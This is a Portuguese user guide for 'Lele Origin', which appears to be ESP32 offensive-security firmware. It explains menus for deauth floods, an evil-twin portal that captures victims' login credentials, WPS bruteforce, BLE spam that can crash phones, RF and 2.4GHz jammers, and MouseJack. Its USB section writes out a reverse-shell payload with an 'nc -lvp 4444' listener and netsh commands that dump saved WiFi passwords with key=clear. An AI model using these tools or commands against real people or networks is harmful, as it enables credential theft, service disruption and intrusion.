> **Guia ULTRA-DETALHADO** de todas as funcionalidades do firmware Lele Origin.
> Cada opção explicada com: O QUE FAZ, COMO USAR, O QUE SIGNIFICA cada informação.
> Última atualização: 2025-12-19

---

# 🎮 NAVEGAÇÃO BÁSICA

## Como Usar o Dispositivo

### Botões e Toques

| Ação | Como Fazer | Resultado |
|------|------------|-----------|
| **Navegar Menus** | Deslize ← → na tela | Alterna entre menus principais (WiFi, BLE, RF...) |
| **Rolar Opções** | Deslize ↑ ↓ na tela | Move entre opções do menu atual |
| **Selecionar** | Toque no centro | Entra na opção / Confirma ação |
| **Voltar** | Toque no canto superior esquerdo | Volta ao menu anterior |
| **Cancelar Ataque** | Mantenha pressionado | Interrompe ataque em andamento |

### Status Bar (Barra Superior)

A barra no topo da tela mostra:

| Ícone/Texto | Significado |
|-------------|-------------|
| 📶 | WiFi conectado (quanto mais barras, melhor sinal) |
| 🔵 | Bluetooth ativo |
| 🔋 100% | Nível da bateria |
| 32°C | Temperatura do sensor (se habilitado) |
| ⏰ 14:30 | Hora atual |

---

# 1. 📶 MENU WIFI

O menu WiFi é o mais completo do sistema, com dezenas de funcionalidades ofensivas e defensivas.

---

## 1.1 Conectar AP

### O que faz

Conecta o dispositivo a uma rede WiFi existente. Necessário para funcionalidades que precisam de internet (SSH, Telnet, NTP, Wigle upload).

### Como usar

1. Selecione "Conectar AP"
2. Aguarde o scan (5-10 segundos)
3. Aparece lista de redes

### O que aparece na tela

```
Redes WiFi Disponíveis
──────────────────────
#MinhaRede (-45|WPA2)
#Vizinho_5G (-72|WPA2)
 RedeAberta (-80|Open)
```

### Significado de cada parte

| Parte | Exemplo | Significado |
|-------|---------|-------------|
| `#` | `#MinhaRede` | Rede com senha (criptografada) |
| Sem `#` | `RedeAberta` | Rede aberta (sem senha) |
| `(-45)` | `-45 dBm` | **Força do sinal**: -30 a -50 = Excelente, -50 a -70 = Bom, -70 a -85 = Fraco, abaixo de -85 = Muito fraco |
| `WPA2/PSK` | | Tipo de criptografia (WPA2 é seguro, WEP é fraco, Open = sem senha) |

### Preenchimento

- Ao selecionar uma rede com senha, aparece teclado virtual
- **Digite a senha**: Mínimo 8 caracteres para WPA/WPA2
- Se a senha estiver errada: Mostra "Conexão falhou"
- Se correto: Mostra IP obtido (ex: 192.168.1.105)

### Dica

Redes salvas aparecem automaticamente da próxima vez.

---

## 1.2 Iniciar WiFi AP

### O que faz

Cria um ponto de acesso WiFi próprio. Outros dispositivos podem se conectar ao Lele.

### Como usar

1. Selecione "Iniciar WiFi AP"
2. O AP inicia imediatamente

### O que aparece na tela

```
AP Iniciado!
━━━━━━━━━━━━━━━━
SSID: Lele_AP
Senha: Lele_AP
IP: 192.168.4.1
Clientes: 0
```

### Significado

| Campo | Significado | Uso |
|-------|-------------|-----|
| **SSID** | Nome da rede que aparece | Busque "Lele_AP" no celular/PC |
| **Senha** | Senha para conectar | Digite exatamente como mostrado |
| **IP** | Endereço do Lele na rede | Acesse <http://192.168.4.1> no navegador |
| **Clientes** | Quantos conectados | Aumenta quando alguém entra |

### Como acessar a Web UI

1. Conecte celular/PC ao "Lele_AP"
2. Abra navegador
3. Digite: `http://192.168.4.1`
4. Login: admin / LELE

---

## 1.3 Ataques WiFi

### Submenu com 3 tipos principais de ataque

---

### 1.3.1 Target Atks (Ataques Direcionados)

### O que faz

Escaneia redes e permite ataques específicos em uma rede selecionada.

### Passo a passo

1. Selecione "Target Atks"
2. Aguarde scan (10-15 segundos)
3. Lista de redes aparece

### O que aparece

```
Selecione Alvo
──────────────────────
#NET_CARLOS (-42|WPA2)
#VIVO-A5B3 (-58|WPA2)
#5G_Apartamento (-65|WPA2)
 WIFI_GRATIS (-78|Open)
```

### Ao selecionar uma rede, aparece submenu

| Opção | O que faz | Quando usar |
|-------|-----------|-------------|
| **Deauth** | Desconecta todos os clientes | Para capturar handshake ou negar serviço |
| **Clone AP** | Cria rede falsa com mesmo nome | Evil Twin / Phishing |
| **Karma** | Responde a qualquer probe | Captura conexões automáticas |

---

### 1.3.2 Beacon SPAM

### O que faz

Cria dezenas/centenas de redes WiFi falsas simultaneamente.

### Opções

| Opção | O que faz | Exemplo de redes criadas |
|-------|-----------|--------------------------|
| **Rickroll** | Nomes de trechos da música | "Never Gonna", "Give You Up", "Let You Down" |
| **Random** | Nomes aleatórios | "a7Bk9x", "WiFi_3847", "Network_abc" |
| **Custom** | Você define a lista | Carrega de arquivo no SD |

### O que aparece durante ataque

```
BEACON SPAM
━━━━━━━━━━━━━━━━
Beacons/s: 150
Redes ativas: 50
Canal: 6
Tempo: 00:45

[Pressione para parar]
```

### Significado

| Campo | Significado |
|-------|-------------|
| **Beacons/s** | Pacotes enviados por segundo |
| **Redes ativas** | Quantas redes falsas existem |
| **Canal** | Canal WiFi sendo usado |
| **Tempo** | Duração do ataque |

---

### 1.3.3 Deauth Flood

### O que faz

Envia pacotes de desautenticação para TODAS as redes próximas simultaneamente.

### ⚠️ AVISO

Este ataque afeta TODAS as redes na área. Use com responsabilidade.

### O que aparece

```
DEAUTH FLOOD
━━━━━━━━━━━━━━━━
Redes atacadas: 12
Pacotes/s: 500
Deauths total: 15000

Canal atual: 6/13
[Alternando canais...]

[ESC para parar]
```

---

## 1.4 Wifite Mode (NOVO!)

### O que faz

Automação completa de ataques WiFi, similar ao Wifite do Kali Linux. Escaneia, seleciona alvos automaticamente e ataca.

---

### 1.4.1 Scan Redes

### O que faz

Escaneia WiFi e conta quantos clientes cada rede tem (aproximado).

### O que aparece

```
Escaneando redes...
──────────────────────
Detectando clientes...
──────────────────────
15 redes encontradas
```

---

### 1.4.2 Selecionar Alvo

### O que aparece

```
Selecione Alvo
──────────────────────
NET_CARLOS (-42dB) [5 cli]
VIVO-A5B3 (-58dB) [2 cli]
5G_Apart (-65dB) [0 cli]
<Hidden> (-78dB) [1 cli]
```

### Significado

| Parte | Exemplo | Significado |
|-------|---------|-------------|
| Nome | `NET_CARLOS` | SSID da rede |
| `(-42dB)` | `-42 dBm` | Força do sinal |
| `[5 cli]` | 5 clientes | **Quantos dispositivos conectados** (mais clientes = mais chance de capturar handshake) |
| `<Hidden>` | | Rede com SSID oculto |

### Por que clientes importam

- **0 clientes**: Difícil capturar handshake (ninguém para desautenticar)
- **1-3 clientes**: Bom alvo
- **5+ clientes**: Excelente alvo (mais chances)

---

### 1.4.3 Auto: Melhor Sinal

### O que faz

Ataca redes automaticamente, começando pela de melhor sinal.

### Processo

1. Ordena redes por RSSI (melhor sinal primeiro)
2. Ataca cada uma por 15 segundos
3. Tenta capturar handshake
4. Move para próxima

### O que aparece

```
WIFITE AUTO
━━━━━━━━━━━━━━━━
Alvos: 12 redes
Alvo 1/12
━━━━━━━━━━━━━━━━
NET_CARLOS
CH:6 RSSI:-42 CLI:5
━━━━━━━━━━━━━━━━
Atacando...
```

### Status finais possíveis

- **CAPTURADO!** (verde) = Handshake obtido
- **Timeout** (vermelho) = Sem sucesso, move para próximo

---

### 1.4.4 Auto: Mais Clientes

### O que faz

Igual ao anterior, mas prioriza redes com mais clientes conectados.

### Vantagem

Mais clientes = mais chances de capturar handshake legítimo.

---

### 1.4.5 Salvar Resultados

### O que faz

Salva log do ataque em `/lele/logs/wifite_results.txt`

### Conteúdo do arquivo

```
=== Wifite Results ===
Total networks: 12
Handshakes: 3

SSID: NET_CARLOS
BSSID: AA:BB:CC:DD:EE:FF
Channel: 6, RSSI: -42, Clients: 5
Handshake: YES

SSID: VIVO-A5B3
BSSID: 11:22:33:44:55:66
Channel: 11, RSSI: -58, Clients: 2
Handshake: NO
...
```

---

## 1.5 Portal Malicioso (Evil Portal)

### O que faz

Cria um portal WiFi falso que captura credenciais digitadas pelas vítimas.

### Passo a passo

1. Selecione "Portal Malicioso"
2. Escolha template (Facebook, Google, Hotel WiFi, etc.)
3. O AP inicia com captive portal

### O que a vítima vê

Ao conectar no WiFi, é redirecionada para página de login falsa.

### O que você vê

```
EVIL PORTAL
━━━━━━━━━━━━━━━━
SSID: Free_WiFi
Template: Google
Clientes: 2
━━━━━━━━━━━━━━━━
CREDENCIAIS CAPTURADAS:
Email: joao@gmail.com
Senha: senha123
━━━━━━━━━━━━━━━━
```

---

## 1.6 Hacking WiFi (Menu Consolidado)

### Agrupa ataques avançados

---

### 1.6.1 Submenu WPS

### Scan WPS

### O que faz

Procura redes com WPS (Wi-Fi Protected Setup) habilitado.

### O que aparece

```
Scanning WPS...
──────────────────────
3 redes com WPS:

1. NET_CASA [WPS ON]
   BSSID: AA:BB:CC:DD:EE:FF

2. VIVO_FIBRA [WPS ON]
   BSSID: 11:22:33:44:55:66
```

### Após selecionar rede

| Opção | O que faz |
|-------|-----------|
| **Pixie Dust** | Tenta explorar vulnerabilidade no WPS |
| **Bruteforce PIN** | Testa PINs (10000 combinações) |
| **PIN Flood** | DoS no WPS |

### Mensagem do Pixie Dust

```
PIXIE DUST
━━━━━━━━━━━━━━━━
Alvo: NET_CASA
Tentando Pixie...

[AVISO]
Pixie Dust requer análise
offline. Use Reaver no PC
com dados capturados.
```

**Por que precisa de PC:**
O ESP32 não tem poder de processamento para quebrar o PIN. Ele apenas captura os dados necessários.

---

### 1.6.2 Submenu IoT

### O que faz

Ataques específicos para dispositivos IoT.

### Scan Chromecasts

### O que faz

Procura dispositivos Google Cast na rede.

### O que aparece

```
SCAN CHROMECAST
━━━━━━━━━━━━━━━━
Procurando na rede...

Encontrados: 2
1. Sala de TV (192.168.1.50)
2. Quarto (192.168.1.55)

[SELECT para atacar]
```

### Ações possíveis

- **Deauth**: Desconecta o Chromecast do WiFi
- **Rename**: Muda nome exibido (temporário)

---

### Scan Alexa

### O que faz

Procura Amazon Echo/Alexa na rede.

### Nota

Busca por MAC addresses da Amazon (OUI). Se não encontrar sua Alexa:

- Verifique se está na mesma rede
- Pode ser modelo não detectado pelo OUI

---

## 1.7 Analisadores (Sniffers)

### 1.7.1 Captura RAW

### O que faz

Captura TODOS os pacotes WiFi e salva em formato PCAP.

### Configuração

```
SNIFFER RAW
━━━━━━━━━━━━━━━━
Canal: [1-13] ← Selecione
Modo: Raw/EAPOL
Salvar em: SD/LittleFS
```

### O que preencher

| Campo | O que colocar | Por que |
|-------|---------------|---------|
| **Canal** | 1-13 (ou "Hopping") | Canal que quer monitorar (Hopping = todos) |
| **Modo** | Raw = tudo, EAPOL = só handshakes | EAPOL é mais focado |

### Durante captura

```
SNIFFING...
━━━━━━━━━━━━━━━━
Pacotes: 15847
EAPOL: 12
Handshakes: 2
Beacons: 1203
━━━━━━━━━━━━━━━━
Canal: 6
Arquivo: capture_001.pcap
Tamanho: 2.3 MB
```

### Significado

| Campo | Significado |
|-------|-------------|
| **Pacotes** | Total de pacotes capturados |
| **EAPOL** | Pacotes de autenticação (importantes!) |
| **Handshakes** | 4-way handshakes completos capturados |
| **Beacons** | Pacotes de anúncio de redes |

---

## 1.8 Configurar WiFi

### Opções

| Opção | O que faz | O que preencher |
|-------|-----------|-----------------|
| **MAC Address** | Altera MAC do WiFi | `AA:BB:CC:DD:EE:FF` (6 bytes em hex) |
| **Credenciais AP** | SSID/Senha do AP próprio | Nome até 32 chars, senha mínimo 8 |
| **Hidden Networks** | Mostra redes ocultas no scan | On/Off |

---

# 2. 🔵 MENU BLUETOOTH

---

## 2.1 BLE Spam (Submenu)

### Ataques de spam Bluetooth que afetam dispositivos próximos

---

### 2.1.1 Applejuice

### O que faz

Envia pacotes BLE que fazem iPhones mostrarem popup de AirPods constantemente.

### O que a vítima vê

Popup infinito: "AirPods Pro detectado. Conectar?"

### O que você vê

```
APPLEJUICE
━━━━━━━━━━━━━━━━
Pacotes/s: 100
Modelo: AirPods Pro
Alcance: ~10m

[ESC para parar]
```

### Configuração

- Pode selecionar modelo: AirPods, AirPods Pro, AirPods Max, Beats

---

### 2.1.2 SourApple

### O que faz

Versão mais agressiva que pode crashar o Bluetooth em iPhones mais antigos.

### ⚠️ AVISO

Pode causar reinício forçado em alguns dispositivos.

---

### 2.1.3 Spam Windows

### O que faz

Envia pacotes Swift Pair que fazem Windows mostrar notificações de dispositivos Bluetooth.

### O que a vítima vê (Windows)

Popup: "Dispositivo encontrado: [Teclado/Mouse/Fone]"

---

### 2.1.4 Spam Samsung

### O que faz

Simula Galaxy Buds para trigger notificações em celulares Samsung.

---

### 2.1.5 Spam Android

### O que faz

Usa Fast Pair do Google para notificar Androids.

---

### 2.1.6 Spam Todos

### O que faz

Combina todos os ataques simultaneamente. Afeta iOS, Android, Windows.

---

### 2.1.7 Personalizado

### O que faz

Permite definir manualmente o tipo de dispositivo BLE.

### O que preencher

```
CUSTOM BLE SPAM
━━━━━━━━━━━━━━━━
Device Name: [até 20 chars]
Device Type: [0-255]
Manufacturer: [0x004C=Apple, 0x0006=MS]
```

---

## 2.2 Teclado BLE

### O que faz

Transforma o Lele em um teclado Bluetooth. Pode digitar em qualquer dispositivo pareado.

### Passo a passo

1. Selecione "Teclado BLE"
2. No dispositivo alvo, vá em Bluetooth
3. Procure "Keyboard_XXXX"
4. Pareie
5. Use teclado virtual do Lele para digitar

### Usos

- BadUSB sem fio
- Digitar senhas remotamente
- Automação

---

## 2.3 Escanear BLE

### O que faz

Lista todos dispositivos Bluetooth LE próximos.

### O que aparece

```
BLE SCAN
━━━━━━━━━━━━━━━━
Dispositivos: 8

1. Mi Band 5
   MAC: AA:BB:CC:DD:EE:FF
   RSSI: -45 dBm

2. [Unknown]
   MAC: 11:22:33:44:55:66
   RSSI: -67 dBm

3. AirPods Pro
   MAC: 77:88:99:AA:BB:CC
   RSSI: -52 dBm
```

### Significado

| Campo | Significado |
|-------|-------------|
| **Nome** | Nome anunciado pelo dispositivo (ou [Unknown]) |
| **MAC** | Endereço único (pode ser randomizado) |
| **RSSI** | Força do sinal (mais perto de 0 = mais forte) |

---

# 3. 📡 MENU RF (SubGHz)

Trabalha com frequências 315MHz, 433MHz, 868MHz, 915MHz.

---

## 3.1 Escanear/Copiar

### O que faz

Captura sinais de controles remotos, portões, alarmes, etc.

### Passo a passo

1. Selecione "Escanear/Copiar"
2. Pressione o botão do controle alvo perto do Lele
3. Quando capturar, mostra dados

### O que aparece

```
RF SCAN
━━━━━━━━━━━━━━━━
Freq: 433.92 MHz
Aguardando sinal...

[CAPTURADO!]
━━━━━━━━━━━━━━━━
Protocolo: EV1527
Bits: 24
Código: 0xABCDEF
Repeat: 5

[SELECT] Salvar
[ESC] Descartar
```

### Significado

| Campo | Significado |
|-------|-------------|
| **Freq** | Frequência do sinal |
| **Protocolo** | Tipo de codificação (EV1527, PT2262, etc.) |
| **Bits** | Quantidade de bits do código |
| **Código** | Valor hexadecimal capturado |
| **Repeat** | Quantas vezes foi recebido |

---

## 3.2 Bruteforce

### O que faz

Testa todas combinações possíveis de códigos RF.

### ⚠️ AVISO

Pode levar HORAS dependendo do protocolo.

### O que preencher

```
RF BRUTEFORCE
━━━━━━━━━━━━━━━━
Frequência: [433.92]
Protocolo: [EV1527/PT2262]
Bits: [12/16/20/24]
Start: [0x000000]
End: [0xFFFFFF]
Delay (ms): [50]
```

### Campos

| Campo | O que colocar | Exemplo |
|-------|---------------|---------|
| **Frequência** | 315, 433.92, 868 ou 915 MHz | 433.92 |
| **Protocolo** | Depende do dispositivo | EV1527 é comum |
| **Bits** | Tamanho do código | 24 é padrão |
| **Start/End** | Faixa para testar | 0x000000 a 0xFFF = mais rápido |
| **Delay** | Tempo entre códigos | 50ms mínimo |

---

## 3.3 Jammer

### O que faz

Interfere em comunicações RF na frequência selecionada.

### Modos

| Modo | O que faz |
|------|-----------|
| **Jammer Itmt** | Liga/desliga rapidamente (intermitente) |
| **Jammer Total** | Sinal contínuo (mais efetivo, consome mais bateria) |

### O que aparece

```
RF JAMMER
━━━━━━━━━━━━━━━━
Freq: 433.92 MHz
Modo: Contínuo
Potência: 100%
Tempo: 00:15

[ESC para parar]
```

---

## 3.4 Configurar RF

| Opção | O que colocar |
|-------|---------------|
| **RF TX Pin** | GPIO para transmissão (ex: 2) |
| **RF RX Pin** | GPIO para recepção (ex: 4) |
| **RF Module** | Interno ou CC1101 |
| **RF Frequency** | 315/433.92/868/915 MHz |

---

# 4. 💳 MENU RFID

---

## 4.1 Ler Tag

### O que faz

Lê dados de cartões NFC/Mifare.

### Cartões suportados

- Mifare Classic 1K/4K
- Mifare Ultralight
- NTAG213/215/216
- ISO14443A

### O que aparece

```
RFID READ
━━━━━━━━━━━━━━━━
Aproxime cartão...

[LIDO!]
━━━━━━━━━━━━━━━━
Tipo: Mifare Classic 1K
UID: AA BB CC DD
SAK: 08
ATQA: 04 00

Setores legíveis: 16/16
Chave default: A/B

[SELECT] Ver dados
[ESC] Voltar
```

### Significado

| Campo | Significado |
|-------|-------------|
| **UID** | Identificador único do cartão |
| **SAK/ATQA** | Bytes de identificação do tipo |
| **Setores legíveis** | Quantos setores conseguiu ler |
| **Chave default** | Se usou chave padrão (fraco) |

---

## 4.2 Chameleon

### O que faz

Interface com dispositivo Chameleon Mini/Tiny para emulação de cartões.

### Passo a passo

1. Conecte Chameleon via USB/Serial
2. Selecione slot (1-8)
3. Carregue dump ou clone ao vivo

---

# 5. 🔴 MENU INFRAVERMELHO

---

## 5.1 TV-B-Gone

### O que faz

Envia códigos de POWER para desligar TVs de várias marcas.

### O que aparece

```
TV-B-GONE
━━━━━━━━━━━━━━━━
Região: América/Ásia
Códigos: 235
Atual: 47/235
Marca atual: Samsung

[Transmitindo...]
```

### Após terminar

- Se TV desligou: Sucesso!
- Se não: Tente outra posição ou região

---

## 5.2 TV NUKE

### O que faz

Versão mais agressiva, envia códigos mais rápido e repete.

### Diferença do TV-B-Gone

- Envia cada código 3x
- Muda ângulo de transmissão (se tiver LED múltiplo)
- Mais chances de sucesso, mas demora mais

---

## 5.3 IR Read

### O que faz

Captura e decodifica sinais de controles remotos.

### Passo a passo

1. Selecione "IR Read"
2. Aponte controle para o Lele
3. Pressione botão do controle

### O que aparece

```
IR READ
━━━━━━━━━━━━━━━━
Aguardando sinal...

[CAPTURADO!]
━━━━━━━━━━━━━━━━
Protocol: NEC
Address: 0x04
Command: 0x08
Bits: 32
Raw: [lista de tempos]

[SELECT] Salvar
[A] Retransmitir
```

### Significado

| Campo | Significado |
|-------|-------------|
| **Protocol** | NEC, Sony, Samsung, RC5, RC6, etc. |
| **Address** | Endereço do dispositivo |
| **Command** | Código do botão pressionado |
| **Bits** | Tamanho total |
| **Raw** | Tempos em microsegundos |

---

## 5.4 Configurar IR

| Opção | O que colocar | Padrão |
|-------|---------------|--------|
| **IR TX Pin** | GPIO do LED IR | LED onboard |
| **IR RX Pin** | GPIO do receptor | Grove SCL |
| **IR TX Repeats** | Quantas vezes repetir | 0 (sem repeat extra) |

---

# 6. 📻 MENU NRF24

Trabalha com módulo NRF24L01 para comunicação 2.4GHz.

---

## 6.1 Espectro

### O que faz

Visualiza atividade em todos 126 canais 2.4GHz.

### O que aparece

```
NRF24 SPECTRUM
━━━━━━━━━━━━━━━━
[Gráfico de barras]
CH: 0        64       127
    ▁▂▃▄▅▆▇█▇▆▅▄▅▆▇

Canal mais ativo: 76
WiFi detectado: CH 1,6,11
```

### Interpretação

- Picos altos = muita atividade
- Canais 1,6,11 = WiFi (canais 2.4GHz padrão)
- Canais 37,38,39 = BLE Advertising

---

## 6.2 Jammer NRF

### O que faz

Interfere em comunicações 2.4GHz (WiFi, BLE, Zigbee, mouses wireless).

### Modos

| Opção | O que faz |
|-------|-----------|
| **Jammer por Canal** | Escolhe canal específico |
| **Alternador Canal** | Salta entre canais |
| **Dual Jammer** | Usa 2 NRF24 simultaneamente |

---

## 6.3 Ataques Avançados (Dual NRF)

### Requer 2 módulos NRF24 conectados

| Opção | O que faz |
|-------|-----------|
| **Dual Jammer (2CH)** | Jammer em 2 canais ao mesmo tempo |
| **Hyper BLE Spam** | Flood de pacotes BLE advertising |
| **Protocol Hunter** | Detecta protocolos proprietários |
| **MouseJack Dual** | Ataque a mouses/teclados wireless |

---

# 7. 🔌 MENU USB

---

## 7.1 Payloads

### Reverse Shell

### O que faz

Digita comandos que abrem conexão reversa para seu computador.

### O que preencher (no código)

```cpp
usb_payload_reverse_shell("192.168.1.100", 4444);
```

| Parâmetro | O que colocar | Exemplo |
|-----------|---------------|---------|
| **IP** | IP do seu PC listener | 192.168.1.100 |
| **Porta** | Porta para conexão | 4444 |

### No seu PC, execute

```bash
nc -lvp 4444
```

---

### WiFi Stealer

### O que faz

Exporta todas senhas WiFi salvas no Windows.

### Comandos digitados

1. Win+R → cmd
2. `netsh wlan show profiles`
3. Para cada rede: `netsh wlan show profile name="X" key=clear`
4. Salva em arquivo no Desktop

---

# 8. 📁 MENU ARQUIVOS

### Operações em arquivos

| Opção | O que faz |
|-------|-----------|
| **View File** | Mostra conteúdo (texto) |
| **File Info** | Tamanho, data, hash MD5 |
| **Renomear** | Muda nome do arquivo |
| **Copiar** | Copia para área de transferência |
| **Colar** | Cola arquivo copiado |
| **Excluir** | Remove permanentemente |
| **New Folder** | Cria pasta |

### Estrutura padrão SD Card

```
/lele/
├── logs/           → Logs de ataques
├── handshakes/     → Capturas WiFi (.pcap)
├── config/         → Configurações backup
├── captures/       → Pacotes capturados
├── scripts/        → Ducky Scripts (.txt)
├── ir/             → Arquivos IR
└── rf/             → Arquivos SubGHz
```

---

# 15. 🔧 MENU CONFIGURAR

---

## 15.1 Opções Principais

| Opção | O que faz | Valores |
|-------|-----------|---------|
| **Brilho** | Intensidade da tela | 0-100% |
| **Dimmer** | Tempo até escurecer | 5s a 5min |
| **Som** | Ativa/desativa beeps | On/Off + Volume 0-100% |
| **Rotação** | Orientação da tela | 0°, 90°, 180°, 270° |

---

## 15.2 Cores da Interface

| Opção | O que é | Formato |
|-------|---------|---------|
| **Cor Primária** | Cor principal (textos, ícones) | RGB565 hex |
| **Cor Secundária** | Cor de destaque | RGB565 hex |
| **Cor de Fundo** | Background | RGB565 hex (0x0000 = preto) |

---

## 15.3 Monitor de Temperatura

### Opções

| Opção | O que faz | Valor |
|-------|-----------|-------|
| **Ativar Monitor** | Liga sensor DS18B20 | On/Off |
| **Temp Warning** | Aviso inicial | 35°C |
| **Temp Critical** | Alerta vermelho | 45°C |
| **Temp Shutdown** | Desliga sistema | 50°C |
| **Mostrar na Barra** | Exibe temp no status | On/Off |
| **Tipo de Alerta** | Como notificar | LED/Som/Tela/Todos |

---

## 15.4 Factory Reset

### O que faz

Restaura TODAS as configurações para o padrão de fábrica.

### ⚠️ PERDE

- Redes WiFi salvas
- Configurações de pinos
- Chaves Mifare adicionadas
- Preferências de cor/brilho

### O que preencher

Confirme digitando "RESET" no teclado.

---

# 📊 GLOSSÁRIO

| Termo | Significado |
|-------|-------------|
| **dBm** | Decibéis-miliwatt (força do sinal) |
| **BSSID** | MAC address do roteador |
| **SSID** | Nome da rede WiFi |
| **WPA/WPA2** | Tipos de criptografia WiFi |
| **Handshake** | Troca de chaves na conexão WiFi |
| **PMKID** | Identificador de chave (capturável sem cliente) |
| **Deauth** | Pacote que desconecta dispositivos |
| **Beacon** | Pacote de anúncio de rede |
| **EAPOL** | Protocolo de autenticação |
| **OUI** | Identificador do fabricante no MAC |
| **GPIO** | Pinos de entrada/saída do ESP32 |
| **HID** | Human Interface Device (teclado/mouse) |
| **BLE** | Bluetooth Low Energy |

---

*Documentação Lele Origin - v2.0 Ultra-Detalhado*
